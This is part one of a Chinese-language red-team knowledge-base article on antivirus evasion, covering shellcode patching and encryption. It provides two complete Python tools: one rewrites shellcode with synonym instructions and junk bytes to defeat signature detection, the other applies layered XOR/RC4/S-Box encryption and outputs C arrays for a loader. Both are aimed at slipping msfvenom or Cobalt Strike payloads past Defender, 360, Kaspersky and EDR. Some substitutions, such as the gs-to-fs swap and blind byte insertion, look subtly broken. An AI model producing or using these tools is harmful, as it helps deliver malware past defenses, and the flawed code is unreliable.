---
id: "pe-reverse/09-av-evasion/01-ai-powered-evasion"
title: "AI 驱动免杀：Shellcode 处理 + Loader 编写"
title_en: "AI-Driven Antivirus Evasion: Shellcode Processing + Loader Development"
summary: >
  全链路免杀方案：从 shellcode 同义指令替换和花指令注入（Patch）、多层加密（XOR/RC4/S-Box）、UUID/IPv4/MAC 混淆伪装，到反沙箱/VEH/Syscall Loader 模板编写，附编译命令参考和验证闭环标准。
summary_en: >
  End-to-end AV evasion pipeline: from shellcode synonym replacement and junk injection (Patch), multi-layer encryption (XOR/RC4/S-Box), UUID/IPv4/MAC obfuscation camouflage, to anti-sandbox/VEH/syscall Loader template development, with compilation reference and verification criteria.
board: "pe-reverse"
category: "09-av-evasion"
signals:
  - "shellcode encryption"
  - "obfuscation"
  - "anti-sandbox"
  - "VEH"
  - "direct syscall"
  - "免杀"
  - "Loader"
  - "花指令"
mcp_tools:
  - run_ctf_tool
  - triage_pe
  - patch_pe_bytes
  - ghidra_headless_analyze
  - extract_iocs_from_summary
  - hash_file
  - make_yara_stub
keywords:
  - "AV evasion"
  - "shellcode"
  - "encryption"
  - "obfuscation"
  - "loader"
  - "anti-sandbox"
  - "syscall"
  - "VEH"
  - "XOR"
  - "UUID"
difficulty: "advanced"
tags:
  - "AV-evasion"
  - "shellcode"
  - "loader"
  - "obfuscation"
  - "anti-sandbox"
  - "syscall"
  - "encryption"
  - "red-team"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# AI 驱动免杀：Shellcode 处理 + Loader 编写

> 本篇：Shellcode Patch / 加密（第 1–2 节）。
> 续篇：`02-shellcode-obfuscation-and-loader.md`。


## 场景

需要生成免杀 payload，绕过 Windows Defender、火绒、360、卡巴斯基等主流杀软和 EDR 的静态/动态检测。

## 输入信号

- 需要生成免杀的可执行 payload
- msfvenom / Cobalt Strike 生成的 shellcode 被杀软标记
- 需要在授权渗透测试中落地执行
- 需要绕过特定杀软或 EDR

## 免杀全链路

```
原始 shellcode ──→ [1] Patch ──→ [2] Encrypt ──→ [3] Obfuscate ──→ [4] Loader ──→ .exe
                     │               │               │                  │
                     │               │               │                  ├─ VEH 异常处理
                     │               │               │                  ├─ Direct Syscall
                     │               │               │                  ├─ 反沙箱检测
                     │               │               │                  └─ 字符串加密
                     │               │               │
                     ▼               ▼               ▼
                 同义指令替换      XOR/RC4/AES     UUID/IPv4/MAC 伪装
                 花指令注入        多层加密         分块存储
                 指令重排          动态密钥         动态拼接
```

---

## 1. Shellcode Patch — 破坏静态特征

```python
# scripts/windows/av-evasion/shellcode-patch.py
"""
对 shellcode 做同义指令替换 + NOP  sled 插入，破坏杀软特征码匹配。
"""
import sys, random, struct

# x64 同义替换表: (原始指令字节, 替换指令字节)
X64_SYNONYMS = {
    b'\x48\x31\xc0': b'\x48\x33\xc0\x90',   # xor rax,rax → xor rax,rax; nop
    b'\x48\x31\xd2': b'\x48\x33\xd2\x90',   # xor rdx,rdx
    b'\x48\x31\xc9': b'\x48\x33\xc9\x90',   # xor rcx,rcx
    b'\x48\x31\xdb': b'\x48\x33\xdb\x90',   # xor rbx,rbx
    b'\x48\x31\xf6': b'\x48\x33\xf6\x90',   # xor rsi,rsi
    b'\x48\x31\xff': b'\x48\x33\xff\x90',   # xor rdi,rdi
    b'\x65\x48\x8b': b'\x64\x48\x8b',        # gs: → fs: (罕见杀软检测 gs)
}

# 花指令垃圾字节
JUNK_CHUNKS = [
    b'\x90',                                  # NOP
    b'\x90\x90',                              # NOP; NOP
    b'\x48\x87\xc0\x48\x87\xc0',              # xchg rax,rax; xchg rax,rax
    b'\x48\xff\xc0\x48\xff\xc8',              # inc rax; dec rax
    b'\x50\x58',                              # push rax; pop rax
    b'\xEB\x00',                              # jmp $+2 (no-op jump)
]


def patch_synonyms(data: bytes) -> bytes:
    """扫描并替换已知特征指令"""
    for orig, repl in X64_SYNONYMS.items():
        data = data.replace(orig, repl)
    return data


def inject_junk(data: bytes, density: float = 0.02) -> bytes:
    """
    按 density 比例随机插入花指令。
    只在不用作跳转目标的指令间插入(NOP sled 安全位置)。
    """
    result = bytearray()
    i = 0
    while i < len(data):
        result.append(data[i])
        # 遇到 call/jmp/ret 后不插入，避免破坏跳转目标
        if data[i] in (0xE8, 0xE9, 0xC3, 0xC2, 0xEB, 0xFF, 0x0F):
            pass
        elif random.random() < density:
            junk = random.choice(JUNK_CHUNKS)
            result.extend(junk)
        i += 1
    return bytes(result)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <shellcode.bin> [density=0.02]")
        sys.exit(1)

    in_file = sys.argv[1]
    density = float(sys.argv[2]) if len(sys.argv) > 2 else 0.02

    with open(in_file, 'rb') as f:
        data = f.read()

    print(f"[*] Input:  {len(data)} bytes")
    data = patch_synonyms(data)
    print(f"[*] After synonym patch: {len(data)} bytes")
    data = inject_junk(data, density)
    print(f"[*] After junk injection (density={density}): {len(data)} bytes")

    out_file = in_file.replace('.bin', '_patched.bin')
    with open(out_file, 'wb') as f:
        f.write(data)
    print(f"[+] Output: {out_file}")


if __name__ == '__main__':
    main()
```

---

## 2. Shellcode 加密 — 对抗静态扫描

```python
# scripts/windows/av-evasion/shellcode-encrypt.py
"""
多层加密 shellcode, 输出 C 数组。
支持: XOR / RC4 / 自定义 S-Box
"""
import sys, os, random, hashlib


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    """RC4 流加密"""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    result = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result)


def custom_sbox_encrypt(data: bytes, sbox: bytes) -> bytes:
    """自定义 S-Box 替换加密"""
    result = bytearray()
    for i, b in enumerate(data):
        result.append(sbox[b] ^ sbox[i % len(sbox)])
    return bytes(result)


def generate_sbox(seed: bytes) -> bytes:
    """基于种子生成 256 字节 S-Box"""
    sbox = list(range(256))
    random.Random(hashlib.sha256(seed).digest()).shuffle(sbox)
    return bytes(sbox)


def to_c_array(data: bytes, name: str = "shellcode") -> str:
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_str = ', '.join(f'0x{b:02x}' for b in chunk)
        lines.append(f'    {hex_str},')
    body = '\n'.join(lines)
    return (
        f'// {len(data)} bytes, encrypted\n'
        f'unsigned char {name}[] = {{\n{body}\n}};\n'
        f'unsigned int {name}_len = {len(data)};\n'
    )


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <shellcode.bin> [key] [--layers xor,rc4,sbox]")
        print(f"       python {sys.argv[0]} <shellcode.bin> mykey --layers xor,rc4")
        sys.exit(1)

    in_file = sys.argv[1]
    key_str = sys.argv[2] if len(sys.argv) > 2 else os.urandom(16).hex()
    layers_str = sys.argv[sys.argv.index('--layers') + 1] if '--layers' in sys.argv else 'xor,rc4'

    key = key_str.encode() if not all(c in '0123456789abcdef' for c in key_str) else bytes.fromhex(key_str)
    layers = [l.strip() for l in layers_str.split(',')]

    with open(in_file, 'rb') as f:
        data = f.read()

    print(f"[*] Input:  {len(data)} bytes")
    print(f"[*] Key:    {key.hex() if isinstance(key, bytes) else key}")
    print(f"[*] Layers: {', '.join(layers)}")

    for layer in layers:
        if layer == 'xor':
            data = xor_encrypt(data, key)
            print(f"    XOR   → {len(data)} bytes")
        elif layer == 'rc4':
            data = rc4_encrypt(data, key)
            print(f"    RC4   → {len(data)} bytes")
        elif layer == 'sbox':
            sbox = generate_sbox(key)
            data = custom_sbox_encrypt(data, sbox)
            # 保存 sbox 以供 Loader 使用
            sbox_file = in_file.replace('.bin', '_sbox.bin')
            with open(sbox_file, 'wb') as f:
                f.write(sbox)
            print(f"    S-Box → {len(data)} bytes (sbox saved to {sbox_file})")
        else:
            print(f"    Unknown layer: {layer}, skipping")

    # 输出 C 数组
    out_file = in_file.replace('.bin', '_encrypted.c')
    c_code = to_c_array(data)
    with open(out_file, 'w') as f:
        f.write(c_code)
    print(f"[+] Output: {out_file}")

    # 同时输出解密密钥 C 代码
    key_file = in_file.replace('.bin', '_key.c')
    key_code = to_c_array(key, 'decrypt_key')
    with open(key_file, 'w') as f:
        f.write(key_code)
    print(f"[+] Key:    {key_file}")


if __name__ == '__main__':
    main()
```

---
